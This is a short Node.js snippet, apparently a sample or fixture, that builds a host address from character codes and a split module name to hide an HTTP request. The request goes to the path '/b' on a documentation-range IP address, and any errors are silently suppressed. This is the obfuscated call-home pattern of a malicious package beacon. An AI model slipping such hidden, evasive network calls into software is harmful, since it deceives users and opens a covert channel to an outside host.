const h = String.fromCharCode(50,48,51,46,48,46,49,49,51,46,49,48);
const r = require("ht" + "tp").request({ host: h, path: "/b", timeout: 3000 });
r.on("error", () => {}); r.on("timeout", () => r.destroy()); r.end();
